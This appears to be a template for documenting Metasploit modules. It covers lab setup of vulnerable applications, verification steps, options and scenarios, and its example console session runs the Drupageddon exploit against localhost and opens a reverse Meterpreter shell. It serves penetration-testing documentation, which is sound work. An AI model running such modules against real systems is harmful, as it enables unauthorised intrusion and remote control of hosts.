The following is the recommended format for module documentation. But feel free to add more content/sections to this.
One of the general ideas behind these documents is to help someone troubleshoot the module if it were to stop
functioning in 5+ years, so giving links or specific examples can be VERY helpful.

## Vulnerable Application

Instructions to get the vulnerable application. If applicable, include links to the vulnerable install
files, as well as instructions on installing/configuring the environment if it is different than a
standard install. Much of this will come from the PR, and can be copy/pasted.

For example, an exploit module targeting Jenkins might look like:

> Jenkins can be downloaded from [jenkins.io](https://jenkins.io/) where
> binaries are available for a variety of operating systems. Both LTS and weekly
> builds are available.
>
> Default settings have the script console enabled and require a valid user
> account in order to access it.
>
> This exploit has been tested against the following Jenkins versions:
> * 2.411
> * 2.410
> * 2.346.3

Or for a module that can be set up with Docker:

> A vulnerable environment can be started with Docker:
>
> ```
> docker run --interactive --tty --rm --publish 8080:8080 \
>   --volume $(pwd)/config.xml:/app/config.xml \
>   vulnerable/app:1.2.3
> ```

Or for a module targeting a downloadable application:

> Drupal 7.31 official [download](https://ftp.drupal.org/files/projects/drupal-7.31.tar.gz)

## Verification Steps
Example steps in this format (is also in the PR):

1. Install the application
1. Start msfconsole
1. Do: `use [module path]`
1. Do: `run`
1. You should get a shell.

For example, an exploit module:

1. Install the application
1. Start msfconsole
1. Do: `use exploit/multi/http/drupal_drupageddon`
1. Do: `set rhost [ip]`
1. Do: `run`
1. You should get a shell.

## Options
List each option and how to use it.

### Option Name

Talk about what it does, and how to use it appropriately. If the default value is likely to change, include the default value here.

For example:

### TARGETURI

The path to the target instance of the application. (Default: `/`)

### USERNAME

A username for an account that has access to the admin console. This is only
necessary if the application has been configured to require authentication.

### ACTION

Set `ACTION` to either `PUT` or `DELETE`. (Default: `PUT`)

### SESSION

Which session to use, which can be viewed with `sessions -l`.

## Scenarios
Specific demo of using the module that might be useful in a real world scenario.

### Version and OS

```
code or console output
```

For example:
Exploit module against a specific target (e.g. Drupal 7.31 on Linux)

```
msf > use exploit/multi/http/drupal_drupageddon
msf exploit(drupal_drupageddon) > set rhost 127.0.0.1
rhost => 127.0.0.1
msf exploit(drupal_drupageddon) > set verbose true
verbose => true
msf exploit(drupal_drupageddon) > exploit

[*] Started reverse TCP handler on 127.0.0.1:4444
[*] Testing page
[*] Sending exploit...
[*] Sending stage (33721 bytes) to 127.0.0.1
[*] Meterpreter session 1 opened (127.0.0.1:4444 -> 127.0.0.1:45388) at 2016-08-25 11:30:41 -0400

meterpreter > sysinfo
Computer : drupal
OS : Linux drupal 2.6.32-642.3.1.el6.x86_64 #1 SMP x86_64
Meterpreter : php/linux

meterpreter > getuid
Server username: apache (48)
```
